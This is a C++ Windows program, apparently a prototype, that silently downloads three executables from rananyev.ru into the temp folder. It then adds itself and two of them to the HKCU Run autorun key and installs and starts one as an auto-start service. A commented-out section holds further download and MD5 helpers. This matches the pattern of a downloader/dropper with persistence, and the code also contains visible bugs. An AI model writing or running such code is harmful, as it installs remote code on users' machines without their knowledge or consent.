#include "stdafx.h"
#include <iostream>
#include "windows.h"
#include <wininet.h> //MayBeLater
#include <fstream> //MayBeLater
#include <atlstr.h> //MayBeLater
#include <urlmon.h>
#include <tlhelp32.h>
#include <Wincrypt.h> //MayBeLater
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet")

//#define BUFSIZE 1024
//#define MD5LEN  16

#pragma region MayBeNeededLater/*
//Определение битности. Взял кусок кода отсюда: https://support.microsoft.com/en-gb/kb/2060044
#pragma region Is64BitOperatingSystem()
//   FUNCTION: DoesWin32MethodExist(PCWSTR, PCSTR)
//
//   PURPOSE: The function determins whether a method exists in the export 
//   table of a certain module.
//
//   PARAMETERS:
//   * pszModuleName - the name of the module.
//   * pszMethodName - the name of the method.
//
//   RETURN VALUE: The function returns TRUE if the method specified by 
//   methodName exists in the export table of the module specified by 
//   moduleName.
//
BOOL DoesWin32MethodExist(PCWSTR pszModuleName, PCSTR pszMethodName)
{
	HMODULE hModule = GetModuleHandle(pszModuleName);
	if (hModule == NULL)
	{
		return FALSE;
	}
	return (GetProcAddress(hModule, pszMethodName) != NULL);
}


//
//   FUNCTION: Is64BitOperatingSystem()
//
//   PURPOSE: The function determines whether the current operating system is 
//   a 64-bit operating system.
//
//   RETURN VALUE: The function returns TRUE if the operating system is 
//   64-bit; otherwise, it returns FALSE.
//
BOOL Is64BitOperatingSystem()
{
#if defined(_WIN64)
	return TRUE;   // 64-bit programs run only on Win64
#elif defined(_WIN32)
	// 32-bit programs run on both 32-bit and 64-bit Windows
	BOOL f64bitOS = FALSE;
	return ((DoesWin32MethodExist(L"kernel32.dll", "IsWow64Process") &&
		IsWow64Process(GetCurrentProcess(), &f64bitOS)) && f64bitOS);
#else
	return FALSE;  // 64-bit Windows does not support Win16
#endif
}
#pragma endregion

std::string readHashFromFile(const char* filepath)
{
	char chh;
	std::string res = "00112233445566778899aabbccddeeff";
	std::ifstream txtfile("serviceapp.txt");
	if (txtfile.is_open())
	{
		std::cout << "open\n";
		while (txtfile.get(chh))
			std::cout << chh << "lol";
		system("pause");
	}
	for (int i = 0; i < 32; ++i)
	{

		res[i] = txtfile.get();
		std::cout << res[i] << " " << txtfile.get();
		system("pause"); 
	}
	return res;
}

//Скачивание нужного сервиса
int GetService()
{
	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		TEXT("WinInet Test"),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				TEXT("/iuservice/serviceapp/"),
				NULL,
				NULL,
				0,
				INTERNET_FLAG_KEEP_CONNECTION,
				1);

			if (hRequest != NULL) {
				// посылаем запрос
				BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
				std::cout << bSend << std::endl;
				if (bSend) {
					// создаём выходной файл
					std::ofstream fnews("serviceapp.txt", std::ios::out | std::ios::binary);
					BOOL urlread = FALSE;
					//char* servExeBuf = new char[1024];
					//char* servExeUrl;
					//int urlLength;
					//std::wstring url = L"";
					std::wstring urlReading = L"";
					if (fnews.is_open()) for (;;) {
						// читаем данные
						char  szData[1024];
						DWORD dwBytesRead;
						BOOL bRead = ::InternetReadFile(hRequest, szData, sizeof(szData)-1,&dwBytesRead);
						// выход из цикла при ошибке или завершении
						if (bRead == FALSE || dwBytesRead == 0)
							break;
						if (urlread == FALSE)
						{
							int i = 33;
							while (szData[i] != '\n')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							//servExeBuf[i - 33] = '\0';
							urlread = TRUE;
							//urlLength = i - 32;
						}
						
						// сохраняем результат
						szData[dwBytesRead] = 0;
						fnews << szData;
					}
					//servExeUrl = new char[urlLength];
					//for (int i = 0; i < urlLength; ++i)
						//servExeUrl[i] = servExeBuf[i];
					//std::cout << urlLength << "\t"<< servExeBuf;
					//system("pause");
					//std::cout << servExeUrl;
					//system("pause");
					//delete[]servExeBuf;
					//std::string hash = readHashFromFile("serviceapp.txt");
					//system("pause");
					//url += L"servExeUrl";
					const wchar_t* url = urlReading.c_str();
					std::cout << url;//<< IsValidURL(NULL, (LPCTSTR)url, 0);
					HRESULT hr = URLDownloadToFile(NULL, (LPCTSTR)url, _T("iuservice.exe"), 0, NULL); // ссылку из файла выдрать
					//std::cout << hr;
					//delete[]servExeUrl;
				}
				else { std::cout << "req" << std::endl; std::cout << GetLastError(); }
				// закрываем запрос
				::InternetCloseHandle(hRequest);
			}
			else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return 0;
}

//md5 файла
std::string Filemd5(const CString& nameOfFile)
{
	std::string resmd5 = "00112233445566778899aabbccddeeff"; // костыли&велосипеды вперде
	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	HANDLE hFile = NULL;
	BYTE rgbFile[BUFSIZE];
	DWORD cbRead = 0;
	BYTE rgbHash[MD5LEN];
	DWORD cbHash = 0;
	CHAR rgbDigits[] = "0123456789abcdef";
	LPCWSTR filename = (LPCTSTR)nameOfFile;
	// Logic to check usage goes here.

	hFile = CreateFile(filename,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN,
		NULL);

	if (INVALID_HANDLE_VALUE == hFile)
	{
		dwStatus = GetLastError();
		printf("Error opening file %s\nError: %d\n", filename,
			dwStatus);
		return (char*)dwStatus;
	}

	// Get handle to the crypto provider
	if (!CryptAcquireContext(&hProv,
		NULL,
		NULL,
		PROV_RSA_FULL,
		CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %d\n", dwStatus);
		CloseHandle(hFile);
		return (char*)dwStatus;
	}

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %d\n", dwStatus);
		CloseHandle(hFile);
		CryptReleaseContext(hProv, 0);
		return (char*)dwStatus;
	}

	while (bResult = ReadFile(hFile, rgbFile, BUFSIZE,
		&cbRead, NULL))
	{
		if (0 == cbRead)
		{
			break;
		}

		if (!CryptHashData(hHash, rgbFile, cbRead, 0))
		{
			dwStatus = GetLastError();
			printf("CryptHashData failed: %d\n", dwStatus);
			CryptReleaseContext(hProv, 0);
			CryptDestroyHash(hHash);
			CloseHandle(hFile);
			return (char*)dwStatus;
		}
	}

	if (!bResult)
	{
		dwStatus = GetLastError();
		printf("ReadFile failed: %d\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		CryptDestroyHash(hHash);
		CloseHandle(hFile);
		return (char*)dwStatus;
	}

	cbHash = MD5LEN;
	if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0))
	{
		//printf("MD5 hash of file %s is: ", filename);
		for (unsigned int i = 0; i < cbHash; i++)
		{
			//printf("%c%c", rgbDigits[rgbHash[i] >> 4],
				//rgbDigits[rgbHash[i] & 0xf]);
			resmd5[2 * i] = rgbDigits[rgbHash[i] >> 4];
			//std::cout << resmd5[2*i];
			resmd5[2 * i + 1] = rgbDigits[rgbHash[i] & 0xf];
		}
		printf("\n");
	}
	else
	{
		dwStatus = GetLastError();
		printf("CryptGetHashParam failed: %d\n", dwStatus);
	}

	CryptDestroyHash(hHash);
	CryptReleaseContext(hProv, 0);
	CloseHandle(hFile);
	//std::cout << resmd5;
	return resmd5;
}

bool ProcessRunning(const WCHAR* name)
{
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (SnapShot == INVALID_HANDLE_VALUE)
		return false;

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(SnapShot, &procEntry))
		return false;

	do
	{
		if (wcscmp(procEntry.szExeFile, name) == 0)
			return true;
	} while (Process32Next(SnapShot, &procEntry));

	return false;
}
*/
#pragma endregion

//Установка и запуск сервиса
BOOL InstallAndStartService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
{
	BOOL bResult = FALSE;

	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL != hServiceControlManager)
	{
		SC_HANDLE hService = CreateService(hServiceControlManager,
			(LPCTSTR)strServiceName,
			(LPCTSTR)strDisplayName,
			SC_MANAGER_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			(LPCTSTR)strBinaryPathName,
			0,
			0,
			0,
			0,
			0);
		if (hService != NULL)
		{
			StartService(hService, NULL, NULL);
			bResult = TRUE;
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hServiceControlManager);
	}

	return bResult;
}

BOOL StopAndDeleteService(const CString& strServiceName)
{
	BOOL bResult = FALSE;

	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL != hServiceControlManager)
	{
		SC_HANDLE hService = OpenService(hServiceControlManager, (LPCTSTR)strServiceName, SC_MANAGER_ALL_ACCESS);
		if (hService != NULL)
		{
			ControlService(hService, SERVICE_CONTROL_STOP, NULL);
			DeleteService(hService);
			bResult = TRUE;
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hServiceControlManager);
	}

	return bResult;
}

int _tmain(int argc, _TCHAR* argv[])
{
	StopAndDeleteService("IUservice");
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY newValue;
	//CreateDirectory(_T("C:\\Program Files\\IUservice"), NULL);
	TCHAR szTempPathBuffer[MAX_PATH];
	GetTempPath(MAX_PATH, szTempPathBuffer);
	RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);
	RegSetValueEx(newValue, _T("Iservice"), 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	std::wstring filePath = szTempPathBuffer;
	filePath += L"\iuservice.exe";
	HRESULT hr1 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/iuservice.exe"), filePath.c_str(), 0, NULL);
	// Здесь прописать урл файлов и под каким именем их сохранять
	filePath = szTempPathBuffer;
	filePath += L"\hello_word.exe";
	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/hello_word.exe"), filePath.c_str(), 0, NULL);
	RegSetValueEx(newValue, _T("hello_word"), 0, REG_SZ, (LPBYTE)filePath.c_str(), sizeof(LPBYTE)*filePath.size());
	filePath = szTempPathBuffer;
	filePath += L"\empty.exe";
	HRESULT hr3 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/empty.exe"), filePath.c_str(), 0, NULL);
	RegSetValueEx(newValue, _T("empty"), 0, REG_SZ, (LPBYTE)filePath.c_str(), sizeof(LPBYTE)*filePath.size());
	RegCloseKey(newValue);

	filePath = szTempPathBuffer;
	filePath += L"\iuservice.exe";
	std::string str1(filePath.begin(), filePath.end());
	InstallAndStartService("IUservice", "IUservice", str1.c_str());
	

	//HKEY new123Value;
	//WCHAR proc[MAX_PATH];
	//DWORD a = 8192;
	//RegOpenKey(HKEY_LOCAL_MACHINE, _T("Hardware\\Description\\System\\CentralProcessor\\0\\"), &new123Value);
	//RegGetValue(HKEY_LOCAL_MACHINE, _T("Hardware\Description\System\CentralProcessor\0"), _T("ProcessorNameString"), RRF_RT_ANY, NULL, proc, &a);
	//std::wstring aaa = proc;
	//std::string aa(aaa.begin(), aaa.end());
	//std::cout << aa.c_str();
	//Здесь сервис запустился, увидел, что процессов нет и запустил их
	//system("pause");
	return 0;
}